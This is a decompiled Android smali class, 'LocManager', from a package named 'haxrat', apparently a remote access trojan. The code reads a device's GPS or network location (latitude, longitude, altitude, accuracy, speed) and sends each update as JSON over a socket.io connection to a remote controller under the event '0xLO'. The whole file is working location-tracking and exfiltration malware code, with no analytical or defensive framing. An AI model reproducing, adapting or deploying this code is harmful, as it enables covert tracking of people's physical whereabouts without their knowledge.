.class public Lcom/hax4us/haxrat/LocManager;
.super Ljava/lang/Object;
.source "LocManager.java"

# interfaces
.implements Landroid/location/LocationListener;


# static fields
.field private static final MIN_DISTANCE_CHANGE_FOR_UPDATES:J = 0xaL

.field private static final MIN_TIME_BW_UPDATES:J = 0xea60L


# instance fields
.field accuracy:F

.field altitude:D

.field canGetLocation:Z

.field isGPSEnabled:Z

.field isNetworkEnabled:Z

.field latitude:D

.field location:Landroid/location/Location;

.field protected locationManager:Landroid/location/LocationManager;

.field longitude:D

.field private final mContext:Landroid/content/Context;

.field speed:F


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    .line 41
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    move-object v2, v0

    const/4 v3, 0x0

    iput-boolean v3, v2, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z

    move-object v2, v0

    const/4 v3, 0x0

    iput-boolean v3, v2, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z

    move-object v2, v0

    const/4 v3, 0x0

    iput-boolean v3, v2, Lcom/hax4us/haxrat/LocManager;->canGetLocation:Z

    .line 42
    move-object v2, v0

    const/4 v3, 0x0

    check-cast v3, Landroid/content/Context;

    iput-object v3, v2, Lcom/hax4us/haxrat/LocManager;->mContext:Landroid/content/Context;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 5

    .prologue
    .line 46
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    const/4 v4, 0x0

    iput-boolean v4, v3, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z

    move-object v3, v0

    const/4 v4, 0x0

    iput-boolean v4, v3, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z

    move-object v3, v0

    const/4 v4, 0x0

    iput-boolean v4, v3, Lcom/hax4us/haxrat/LocManager;->canGetLocation:Z

    .line 47
    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/hax4us/haxrat/LocManager;->mContext:Landroid/content/Context;

    .line 48
    move-object v3, v0

    invoke-virtual {v3}, Lcom/hax4us/haxrat/LocManager;->getLocation()Landroid/location/Location;

    move-result-object v3

    return-void
.end method


# virtual methods
.method public canGetLocation()Z
    .locals 3

    .prologue
    .line 107
    move-object v0, p0

    move-object v2, v0

    iget-boolean v2, v2, Lcom/hax4us/haxrat/LocManager;->canGetLocation:Z

    move v0, v2

    return v0
.end method

.method public getData()Lorg/json/JSONObject;
    .locals 10

    .prologue
    .line 111
    move-object v0, p0

    new-instance v5, Lorg/json/JSONObject;

    move-object v9, v5

    move-object v5, v9

    move-object v6, v9

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v5

    .line 112
    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    if-eqz v5, :cond_0

    .line 114
    move-object v5, v2

    :try_start_0
    const-string v6, "enabled"

    const/4 v7, 0x1

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v5

    .line 115
    move-object v5, v2

    const-string v6, "latitude"

    move-object v7, v0

    iget-wide v7, v7, Lcom/hax4us/haxrat/LocManager;->latitude:D

    invoke-virtual {v5, v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    move-result-object v5

    .line 116
    move-object v5, v2

    const-string v6, "longitude"

    move-object v7, v0

    iget-wide v7, v7, Lcom/hax4us/haxrat/LocManager;->longitude:D

    invoke-virtual {v5, v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    move-result-object v5

    .line 117
    move-object v5, v2

    const-string v6, "altitude"

    move-object v7, v0

    iget-wide v7, v7, Lcom/hax4us/haxrat/LocManager;->altitude:D

    invoke-virtual {v5, v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    move-result-object v5

    .line 118
    move-object v5, v2

    const-string v6, "accuracy"

    move-object v7, v0

    iget v7, v7, Lcom/hax4us/haxrat/LocManager;->accuracy:F

    float-to-double v7, v7

    invoke-virtual {v5, v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    move-result-object v5

    .line 119
    move-object v5, v2

    const-string v6, "speed"

    move-object v7, v0

    iget v7, v7, Lcom/hax4us/haxrat/LocManager;->speed:F

    float-to-double v7, v7

    invoke-virtual {v5, v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v5

    .line 121
    move-object v5, v2

    move-object v0, v5

    .line 123
    :goto_0
    return-object v0

    .line 121
    :catch_0
    move-exception v5

    move-object v3, v5

    .line 122
    move-object v5, v2

    move-object v0, v5

    goto :goto_0

    .line 123
    :cond_0
    move-object v5, v2

    move-object v0, v5

    goto :goto_0
.end method

.method public getLocation()Landroid/location/Location;
    .locals 7

    .prologue
    .line 54
    move-object v0, p0

    move-object v4, v0

    move-object v5, v0

    :try_start_0
    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->mContext:Landroid/content/Context;

    const-string v6, "location"

    invoke-virtual {v5, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/location/LocationManager;

    iput-object v5, v4, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;

    .line 56
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;

    const-string v6, "gps"

    invoke-virtual {v5, v6}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v5

    iput-boolean v5, v4, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z

    .line 58
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;

    const-string v6, "network"

    invoke-virtual {v5, v6}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v5

    iput-boolean v5, v4, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z

    .line 60
    move-object v4, v0

    iget-boolean v4, v4, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z

    if-nez v4, :cond_0

    move-object v4, v0

    iget-boolean v4, v4, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z

    if-eqz v4, :cond_2

    .line 62
    :cond_0
    move-object v4, v0

    const/4 v5, 0x1

    iput-boolean v5, v4, Lcom/hax4us/haxrat/LocManager;->canGetLocation:Z

    .line 63
    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    const-string v5, "android.permission.ACCESS_FINE_LOCATION"

    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    const/4 v5, 0x0

    if-ne v4, v5, :cond_2

    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v4}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v4

    const-string v5, "android.permission.ACCESS_COARSE_LOCATION"

    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    const/4 v5, 0x0

    if-ne v4, v5, :cond_2

    .line 66
    move-object v4, v0

    iget-boolean v4, v4, Lcom/hax4us/haxrat/LocManager;->isNetworkEnabled:Z

    if-eqz v4, :cond_1

    .line 68
    move-object v4, v0

    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;

    if-eqz v4, :cond_1

    .line 69
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;

    const-string v6, "network"

    invoke-virtual {v5, v6}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v5

    iput-object v5, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    .line 70
    move-object v4, v0

    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    if-eqz v4, :cond_1

    .line 71
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getLatitude()D

    move-result-wide v5

    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->latitude:D

    .line 72
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getLongitude()D

    move-result-wide v5

    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->longitude:D

    .line 73
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getAltitude()D

    move-result-wide v5

    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->altitude:D

    .line 74
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getAccuracy()F

    move-result v5

    iput v5, v4, Lcom/hax4us/haxrat/LocManager;->accuracy:F

    .line 75
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getSpeed()F

    move-result v5

    iput v5, v4, Lcom/hax4us/haxrat/LocManager;->speed:F

    .line 81
    :cond_1
    move-object v4, v0

    iget-boolean v4, v4, Lcom/hax4us/haxrat/LocManager;->isGPSEnabled:Z

    if-eqz v4, :cond_2

    .line 82
    move-object v4, v0

    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    if-nez v4, :cond_2

    .line 84
    move-object v4, v0

    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;

    if-eqz v4, :cond_2

    .line 85
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->locationManager:Landroid/location/LocationManager;

    const-string v6, "gps"

    invoke-virtual {v5, v6}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v5

    iput-object v5, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    .line 86
    move-object v4, v0

    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    if-eqz v4, :cond_2

    .line 87
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getLatitude()D

    move-result-wide v5

    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->latitude:D

    .line 88
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getLongitude()D

    move-result-wide v5

    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->longitude:D

    .line 89
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getAltitude()D

    move-result-wide v5

    iput-wide v5, v4, Lcom/hax4us/haxrat/LocManager;->altitude:D

    .line 90
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getAccuracy()F

    move-result v5

    iput v5, v4, Lcom/hax4us/haxrat/LocManager;->accuracy:F

    .line 91
    move-object v4, v0

    move-object v5, v0

    iget-object v5, v5, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    invoke-virtual {v5}, Landroid/location/Location;->getSpeed()F

    move-result v5

    iput v5, v4, Lcom/hax4us/haxrat/LocManager;->speed:F
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 103
    :cond_2
    :goto_0
    move-object v4, v0

    iget-object v4, v4, Lcom/hax4us/haxrat/LocManager;->location:Landroid/location/Location;

    move-object v0, v4

    return-object v0

    .line 91
    :catch_0
    move-exception v4

    move-object v2, v4

    .line 100
    move-object v4, v2

    invoke-virtual {v4}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public onLocationChanged(Landroid/location/Location;)V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/location/Location;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 128
    move-object v0, p0

    move-object v1, p1

    move-object v3, v1

    if-eqz v3, :cond_0

    .line 129
    move-object v3, v0

    move-object v4, v1

    invoke-virtual {v4}, Landroid/location/Location;->getLatitude()D

    move-result-wide v4

    iput-wide v4, v3, Lcom/hax4us/haxrat/LocManager;->latitude:D

    .line 130
    move-object v3, v0

    move-object v4, v1

    invoke-virtual {v4}, Landroid/location/Location;->getLongitude()D

    move-result-wide v4

    iput-wide v4, v3, Lcom/hax4us/haxrat/LocManager;->longitude:D

    .line 131
    move-object v3, v0

    move-object v4, v1

    invoke-virtual {v4}, Landroid/location/Location;->getAltitude()D

    move-result-wide v4

    iput-wide v4, v3, Lcom/hax4us/haxrat/LocManager;->altitude:D

    .line 132
    move-object v3, v0

    move-object v4, v1

    invoke-virtual {v4}, Landroid/location/Location;->getAccuracy()F

    move-result v4

    iput v4, v3, Lcom/hax4us/haxrat/LocManager;->accuracy:F

    .line 133
    move-object v3, v0

    move-object v4, v1

    invoke-virtual {v4}, Landroid/location/Location;->getSpeed()F

    move-result v4

    iput v4, v3, Lcom/hax4us/haxrat/LocManager;->speed:F

    .line 135
    :cond_0
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v3

    const-string v4, "0xLO"

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Object;

    move-object v9, v5

    move-object v5, v9

    move-object v6, v9

    const/4 v7, 0x0

    move-object v8, v0

    invoke-virtual {v8}, Lcom/hax4us/haxrat/LocManager;->getData()Lorg/json/JSONObject;

    move-result-object v8

    aput-object v8, v6, v7

    invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v3

    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "I",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method
